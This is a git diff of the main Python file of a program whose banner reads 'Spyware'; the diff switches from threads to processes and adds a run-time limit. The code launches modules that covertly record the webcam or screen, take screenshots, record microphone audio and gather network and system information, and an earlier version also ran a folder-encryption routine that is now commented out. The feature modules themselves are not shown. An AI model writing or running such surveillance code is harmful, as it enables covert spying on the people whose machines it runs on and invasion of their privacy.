@@ -1,11 +1,16 @@
+import traceback
+import time
 import keyboard
-import threading
+from multiprocessing import Process
 from Features.CmdPrompts.CmdPrompts import CmdPrompts
 from Features.Webcamera.Webcamera import Webcamera
 from Features.Screenshot.Screenshot import Screenshot
 from Features.Soundfile.Soundfile import Soundfile
 from Features.SystemInformation.SystemInformation import SystemInformation
 from Util.FileEncryption import FileEncryption
+from Util.DataClass import DataClass
+
+import os
 
 
 class MainFileException(Exception):
@@ -15,62 +20,68 @@ class MainFileException(Exception):
 exit_program = False
 
 
-def main():
-    ascii_art = """
-           _____                                    
-          / ____|                                   
-         | (___  _ __  _   ___      ____ _ _ __ ___ 
-          \___ \| '_ \| | | \ \ /\ / / _` | '__/ _ \
-          ____) | |_) | |_| |\ V  V / (_| | | |  __/
-         |_____/| .__/ \__, | \_/\_/ \__,_|_|  \___|
-                | |     __/ |                       
-                |_|    |___/                                                    
-        """
+class Main(DataClass):
+    def __init__(self):
+        super().__init__()  # Call the base class __init__ method
+        self.end_time = self.end_time
 
-    print(ascii_art)
+    def run_feature(self, feature_class, feature_method):
+        feature = feature_class()
+        method = getattr(feature, feature_method)
+        method()
 
-    try:
-        # Create instances of the classes
-        cmd_prompts = CmdPrompts()
-        web_camera = Webcamera()
-        screenshot = Screenshot()
-        microphone = Soundfile()
-        sys_info = SystemInformation()
-        file_encryptor = FileEncryption()
+    def main(self):
+        ascii_art = """
+               _____                                    
+              / ____|                                   
+             | (___  _ __  _   ___      ____ _ _ __ ___ 
+              \___ \| '_ \| | | \ \ /\ / / _` | '__/ _ \
+              ____) | |_) | |_| |\ V  V / (_| | | |  __/
+             |_____/| .__/ \__, | \_/\_/ \__,_|_|  \___|
+                    | |     __/ |                       
+                    |_|    |___/                                                    
+            """
 
-        # Create threads for each feature
-        threads = [
-            threading.Thread(target=cmd_prompts.ipconfig_all),
-            threading.Thread(target=cmd_prompts.netstat_ano),
-            threading.Thread(target=web_camera.record_screen),
-            threading.Thread(target=screenshot.screenshot),
-            threading.Thread(target=microphone.audio_recording),
-            threading.Thread(target=sys_info.system_information),
-            threading.Thread(target=file_encryptor.encrypt_folders)
-        ]
+        print(ascii_art)
 
-        # Start the threads
-        for thread in threads:
-            thread.start()
+        try:
+            processes = [
+                Process(target=self.run_feature, args=(CmdPrompts, 'ipconfig_all')),
+                Process(target=self.run_feature, args=(CmdPrompts, 'netstat_ano')),
+                Process(target=self.run_feature, args=(Webcamera, 'record_screen')),
+                Process(target=self.run_feature, args=(Screenshot, 'screenshot')),
+                Process(target=self.run_feature, args=(Soundfile, 'audio_recording')),
+                Process(target=self.run_feature, args=(SystemInformation, 'system_information')),
+                # Process(target=self.run_feature, args=(FileEncryption, 'encrypt_files')),
+            ]
 
-        # Wait for all threads to finish
-        for thread in threads:
-            thread.join()
+            # Start the processes
+            for process in processes:
+                process.start()
 
-    except Exception as error:
-        raise MainFileException(f"Main failed to run") from error
+            # Wait for all processes to finish
+            for process in processes:
+                process.join()
+
+        except Exception as error:
+            raise MainFileException(f"Main failed to run") from error
 
 
 if __name__ == '__main__':
-    try:
-        while not exit_program:
-            main()
+    print(os.getcwd())
+    main = Main()
 
-            if keyboard.is_pressed("q"):
+    try:
+        while time.time() < main.end_time and not exit_program:
+            main.main()
+            if keyboard.is_pressed('q'):
                 exit_program = True
+                print("Program has been terminated")
+                break
 
     except MainFileException as e:
-        print(f"Main failed to run: {str(e)}")
+        print(f"Main failed to run: {e}")
+        print(f"Original error: {e.__cause__}")
+        traceback.print_exc()
     finally:
-        # Perform cleanup here if needed
         pass
